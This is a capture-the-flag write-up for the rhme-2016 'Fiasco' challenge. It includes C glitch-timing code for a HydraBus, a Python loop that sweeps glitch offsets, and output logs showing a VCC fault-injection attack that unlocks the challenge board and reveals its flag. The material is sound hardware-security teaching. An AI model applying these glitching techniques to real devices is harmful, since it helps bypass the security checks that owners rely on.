# rhme-2016 write-up Fiasco

<a name="fiasco"></a>
## Fiasco (Fault Injection - 100 pts)

Despite the discouragement from eletronic guys of the team I have decide to go 
for my VCC glitch setup ;)

We removed all capacitors located in the board and powered the arduino by an 
external power supply at 4.5V.

In order to perform the glitch we used an HydraBus with a glitch time as input.
We connected an HydraBus gpio pin to a mosfet to drive the current from 1 to 0 
and from 0 to 1 quickly. 

The piece of code is here below:

``` c
void glitch_n(uint32_t port_trigger, int pin_trigger, uint32_t port_, int pin_, 
	      uint32_t glitch_length, uint32_t glitch, uint32_t * glitch_offset)
{

        uint32_t t;
        t = bsp_gpio_pin_read(port_trigger,pin_trigger);
        while(t == bsp_gpio_pin_read(port_trigger,pin_trigger));

        t = 0;
        // Loop on glitchs
        while(t < glitch)
        {
                // Delay the glitch
                wait_nbcycles(glitch_offset[t++]);

                // Perform the glitch during glitch_length
                clr(port_,pin_);
                wait_nbcycles(glitch_length);
                set(port_,pin_);
        }

}
```

We do have a trigger that we connected to arduino's TX. In this setup,
the glitch_length has been set to 100.

The calibration of the glitch has been performed on easyfi.hex. And then we ran
this script to seek after a successful fault injection:
``` python
while(1):                                                                       
    # Setup Hydra to glitch VCC                                                 
    hydracon.flush()                                                            
    hydracon.write(glitch_cmd_ + "\n")                                          
    time.sleep(0.3)                                                             
    rhmecon.write("\r\n")                                                       
    rr = rhmecon.read_all()                                                     
    result.write(glitch_cmd_ + "\n")                                            
    result.write(rr)                                                            
    result.flush()                                                              
    print rr                                                                    
    print "glitch done"                                                         
                                                                                
    glitch_cmd_ = glitch_cmd                                                    
    for i in range(len(offsets)):                                               
        glitch_cmd_ = glitch_cmd_ + " offsets " + str(int(offsets[i]) + int(steps[i]))
        offsets[i] = str(int(offsets[i]) + int(steps[i]))
    print glitch_cmd_                                    
    if ("flag" in rr):                                   
        end_of_prgm() 

```
And here is the output obtained:

```
Please write your password: gpio glitch trigger PB0 pin PC15 length 100 offsets 191000
Good try, cheater!^M
Chip locked^M
Please write your password: gpio glitch trigger PB0 pin PC15 length 100 offsets 191100
Good try, cheater!^M
Chip locked^M
Please write your password: gpio glitch trigger PB0 pin PC15 length 100 offsets 191200
Good try, cheater!^M
Chip locked^M
Please write your password: gpio glitch trigger PB0 pin PC15 length 100 offsets 191300
Chip unlocked^M
Your flag is: 02ab16ab3729fb2c2ec313e4669d319egpio glitch trigger PB0 pin PC15 length 100 offsets 191400
```
